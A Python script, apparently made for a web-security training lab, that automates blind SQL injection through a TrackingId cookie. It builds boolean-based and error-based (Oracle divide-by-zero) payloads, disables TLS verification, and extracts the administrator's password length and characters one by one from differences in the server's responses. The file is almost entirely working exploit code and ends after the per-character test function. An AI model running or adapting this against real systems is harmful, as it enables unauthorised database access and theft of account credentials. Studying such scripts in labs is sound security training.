import requests
from requests.utils import dict_from_cookiejar, cookiejar_from_dict
import sys
import concurrent.futures
import urllib3
urllib3.disable_warnings()

def generate_payload(position,char,type_condition):
    if type_condition:
        return f"'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username+=+'administrator'),+{position},+1)+=+'{char}"
    else:
        char =f"='{char}'" if len(char)<=1 else char
        return f"' ||  (SELECT CASE WHEN substr(password,{position},1) {char} THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' ) || '"

def update_cookies(session,url,payload,cookies):
    cookies=cookies.copy()
    cookies['TrackingId']+=payload
    r=session.get(url,verify=False,timeout=5,cookies=cookies)
    return r

def find_number_of_chars(session,url,cookies,condition,type_condition=True):
    n=1
    p='' if type_condition else "is null"
    payload=generate_payload(n,p,type_condition)
    r=update_cookies(session,url,payload,cookies)
    while  condition not in r.text:
        n+=1
        payload=generate_payload(n,p,type_condition)
        r=update_cookies(session,url,payload,cookies)    

    return n-1


def it_this_char(session,url,position,c,cookies,condition,type_condition=True):
    payload=generate_payload(position,c,type_condition)
    r=update_cookies(session,url,payload,cookies)
    test=(condition not in r.text) if type_condition else (condition in r.text)
    if test:
        return True,c
    else:
        return False,c